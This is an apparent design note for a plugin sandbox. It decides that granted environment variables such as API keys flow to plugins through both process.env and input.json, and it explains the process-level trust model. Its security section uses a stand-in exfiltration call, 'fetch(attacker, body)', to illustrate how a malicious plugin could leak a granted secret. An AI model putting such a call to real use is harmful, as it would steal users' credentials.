---
status: decision
priority: P1
---

# Manifest env: route through `process.env` AND `input.json`

## Decision

When a plugin declares `env: [{ name: "X", ... }]` in its manifest and the
user grants `--allow-env=X` at install (or per-run), the resolved value
flows through **both** channels:

1. **`process.env.X`** — the conventional ecosystem path. Libraries like
   `new OpenAI()`, `new Anthropic()`, `postgres()`, `aws-sdk`, etc. auto-
   pick up named credentials. Plugin authors don't have to plumb anything.
2. **`input.env.X`** via `readInput()` — the structured path. Useful when
   the plugin wants explicit access (e.g. validation, defaulting, passing
   through to a config object) or when the value isn't credential-shaped.

The two channels carry the same value. The plugin author picks which is
more ergonomic per call site.

## Why both

`process.env` alone would force plugins to import the SDK only to fish
values out of `input.env` when libraries already auto-read env. Pure
`input.env` alone makes `new OpenAI()` not work without explicit `apiKey:
input.env.OPENAI_API_KEY` plumbing — every plugin re-derives the same
pattern.

Both is cheap (the host sets `process.env.X` *and* writes the value into
`input.json`) and it lets plugins use whichever feels right.

## Why this is the right security shape

The user's trust boundary is **the plugin**, not "the plugin's main module
vs its transitive deps." A malicious plugin's main code can already leak
a granted value via `fetch(attacker, body)` regardless of which channel
the value arrived on. Hiding the value from transitive deps via
`input.env`-only would be defense-in-feeling, not defense-in-depth — the
plugin author is the trust principal, and they have full access either
way.

What this *does* mean: granting `--allow-env=NAME` to a plugin gives the
whole plugin process (deps included) read access to that name. That's
consistent with how the rest of the sandbox works:

- `--allow-net=*` lets every line of code in the process make any HTTP
  request, including transitive deps.
- `--allow-read=path` lets every line read that path.
- `--allow-env=NAME` lets every line read that env var.

The grant is the contract. It scopes capability at the *process* level,
not at the *module* level. Other models (per-module env access) don't
exist in JS at all — there's no language-level enforcement.

## Mechanism

Today, the host computes `resolvedEnv` (line ~231 of `plugin-run.ts`) and
writes it into `input.json` only. **Add**:

- For each name in `resolvedEnv`, set `childEnv[name] = value` on the
  literal we hand to `spawn()`.
- For each name in `resolvedEnv`, append it to the `--allow-env` list
  (alongside the hardcoded `DITHER_*` + behavior shims).

`input.json` continues to carry the same values for plugins that want
structured access via `readInput()`.

## Concrete example

Manifest:

```json
{ "name": "summarize",
  "dither": {
    "env": [
      { "name": "OPENAI_API_KEY",
        "description": "Your OpenAI API key." },
      { "name": "MODEL",
        "default": "gpt-4o" }
    ]
  }
}
```

Install:

```sh
dither env set OPENAI_API_KEY sk-...
dither plugin install ./summarize --allow-env=OPENAI_API_KEY
```

Plugin code, both styles work:

```ts
// Style A: ecosystem-conventional, library auto-reads.
import OpenAI from "npm:openai";
const openai = new OpenAI();           // auto-picks up process.env.OPENAI_API_KEY

// Style B: structured access via SDK.
import { readInput } from "@dither/plugin";
const input = await readInput();
const model = input.env.MODEL;         // "gpt-4o" from default
```

The plugin author picks the style per concern. Credentials → typically
style A. Behavior switches → typically style B (because they're in input.env
already and are a project-shaped concept rather than a OS-shaped one).

## What about the hardcoded shim list?

Separate concern. The shim list (`DEBUG`, `NODE_ENV`, `FORCE_COLOR`, etc.
— see `notes/sandbox-env-replace-not-filter.md`) lives only in
`process.env` with sanitized constant values. Those names don't
correspond to manifest declarations and don't appear in `input.env` —
they're behavior-switches the runtime needs, not data the plugin asked
for.

## Open / follow-ups

- The CLI flag `dither plugin install --allow-env=NAME` today implies
  "look up NAME in dither's global env store." Behavior unchanged; this
  note only changes *where* the resolved value flows.
- The CLI flag `--env NAME=VALUE` (literal, no global lookup) — same:
  resolved value flows to both channels.
- `dither env set/get/list` (the global env store) is unaffected.
- Documentation: the sandbox docs should explain that granting
  `--allow-env=NAME` exposes that name to the whole plugin process,
  consistent with `--allow-read`/`--allow-net`/etc. semantics.

## Cross-references

- `notes/sandbox-trust-model.md` — overarching threat model.
- `notes/sandbox-env-replace-not-filter.md` — child-env construction
  (literal, not filtered). This note layers on top.
